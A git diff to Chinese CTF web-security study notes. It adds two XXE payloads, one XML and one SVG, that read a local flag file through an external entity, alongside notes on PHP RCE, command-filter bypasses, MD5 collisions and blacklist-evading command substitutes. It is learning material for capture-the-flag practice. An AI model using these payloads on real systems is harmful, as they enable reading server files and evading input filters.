@@ -38,6 +38,24 @@
 
 8. php无字母数字rce之自增利用。例题：[RCE挑战2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%982.md)
 9. xml基本xxe利用。例题：[[NCTF2019]Fake XML cookbook](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BNCTF2019%5DFake%20XML%20cookbook.md)。注意[svg文件](https://baike.baidu.com/item/SVG%E6%A0%BC%E5%BC%8F/3463453)也是基于xml开发的，同样也有xxe。例题:[[BSidesCF 2019]SVGMagic](https://blog.csdn.net/shinygod/article/details/124052707)
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE xxe [
+<!ENTITY flag SYSTEM  "file:///flag.txt">
+]>
+<user>
+	<name>&flag;</name>
+</user>
+```
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY file SYSTEM "file:///flag.txt" >
+]>
+<svg height="100" width="1000">
+  <text x="10" y="20">&file;</text>
+</svg>
+```
 10. shell命令执行常见[绕过](https://blog.51cto.com/m0re/3879244)
 11. [md5碰撞](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)。这是一些hex编码下内容不同却能产生相同md5值的字符串。
 12. 一些在黑名单过滤时可互相交换的命令
@@ -45,7 +63,7 @@
 > ls<Br>dir
 - 输出文件内容
 > cat<br>[sort](https://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html)。sort本是排序命令，但是默认会把执行后的结果输出到终端。<Br>[tail](https://www.runoob.com/linux/linux-comm-tail.html)，默认显示文件尾部的内容。由于flag文件基本不会超过十行，所以作用差不多<br>tac，倒序输出文件内容
-13. ssti（模板注入）。这张简单但是经典的表说明当出现ssti时如何测试是什么模板。
+1.  ssti（模板注入）。这张简单但是经典的表说明当出现ssti时如何测试是什么模板。
 
 ![ssti_test](../../CTF/BUUCTF/images/Pasted-1-768x458.png)
 
